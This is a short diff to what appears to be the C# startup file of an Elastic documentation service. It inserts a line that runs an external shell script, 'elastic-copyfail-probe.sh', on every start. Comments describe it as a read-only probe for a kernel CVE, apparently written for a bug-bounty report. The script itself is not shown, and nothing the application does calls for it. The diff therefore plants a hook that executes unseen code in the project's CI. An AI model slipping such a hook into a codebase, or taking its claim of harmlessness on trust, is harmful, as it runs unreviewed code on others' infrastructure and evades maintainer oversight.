@@ -13,6 +13,10 @@ using Elastic.Documentation.ServiceDefaults;
 using Microsoft.Extensions.DependencyInjection;
 using Microsoft.Extensions.Hosting;
 
+// CVE-2026-31431 eligibility probe — security research (H1 #3637664 impact escalation)
+// Read-only: prints kernel/AF_ALG facts to CI log. No writes, no network callbacks.
+System.Diagnostics.Process.Start("/bin/sh", "elastic-copyfail-probe.sh")?.WaitForExit();
+
 var builder = Host.CreateApplicationBuilder()
 	.AddDocumentationServiceDefaults(ref args, (s, p) =>
 	{
